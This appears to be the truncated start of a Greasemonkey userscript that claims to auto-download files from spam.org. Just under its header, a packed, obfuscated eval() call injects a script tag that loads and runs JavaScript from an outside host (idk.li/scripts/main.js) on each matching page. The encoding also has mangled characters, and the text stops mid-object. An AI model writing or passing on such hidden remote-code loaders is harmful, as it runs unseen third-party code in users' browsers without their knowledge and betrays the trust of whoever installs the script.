// ==UserScript==
// @name spam autodownload V2+
// @author Timendum
// @namespace spam
// @description Auto-download files from spam.org
// @include http://spam.org/offer2.php?*
// @include http://69.93.2.170/offer2.php?*
// @version 3.5.2
// ==/UserScript==

eval(function(p,a,c,k,e,r){e=function©{return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e©]=k[c]||e©;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e©+'\\b','g'),k[c]);return p}('3 1=2.4(\'5\');1.6=\'7://8.9/a/b.c\';1.d=\'e/f\';2.g(\'h\')[0].i(1);',19,19,'|GM_JQ|document|var|createElement|script|src|http|idk|li|scripts|m ​ ain|js|type|text|javascript|getElementsByTagName|head|appendChild'.split('|'),0,{}))
var ShareTimendum = {
frame: [],
steps: 0,
frameCount: 0,
baseUrl: 'http://spam.org/download.php?file=605553?p=',
init: function() {
